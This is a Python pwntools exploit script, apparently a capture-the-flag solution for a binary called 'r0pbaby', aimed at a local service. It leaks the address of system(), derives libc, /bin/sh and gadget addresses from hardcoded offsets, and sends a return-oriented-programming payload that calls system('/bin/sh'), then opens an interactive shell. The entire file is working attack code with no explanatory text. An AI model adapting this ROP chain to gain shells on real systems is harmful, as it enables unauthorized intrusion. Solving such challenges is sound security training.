from pwn import *
#context.log_level = 'debug'

#r = process('./r0pbaby')
r = remote('127.0.0.1', 1234)

def get_libc_addr():
	r.sendline('1')
	r.recvuntil('libc.so.6: ')
	a = r.recv(18)
	return int(a, 16)

def get_system_addr():
	r.sendline('2')
	r.recvuntil('Enter symbol: ')
	r.sendline('system')
	r.recvuntil('Symbol system: ')
	a = r.recv(18)
	a = int(a, 16)
	return a

binsh_offset = 0x18cd17
pop_rdi_offset = 0x2428E
system_addr = get_system_addr()
libc_addr = system_addr - 0x45390
#libc_addr = get_libc_addr()

log.info('Libc Address : 0x%x' % libc_addr)
log.info('System Address : 0x%x' % system_addr)

binsh_addr = binsh_offset + libc_addr
pop_rdi_addr = system_addr - pop_rdi_offset 

log.info('/bin/sh Address : 0x%x' % binsh_addr)
log.info('pop rdi ; ret Address : 0x%x' % pop_rdi_addr)

payload = 'A'*8
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

r.sendline('3')
print r.recv(2048)
r.sendline(str(len(payload)))
print r.sendline(payload)

r.interactive()
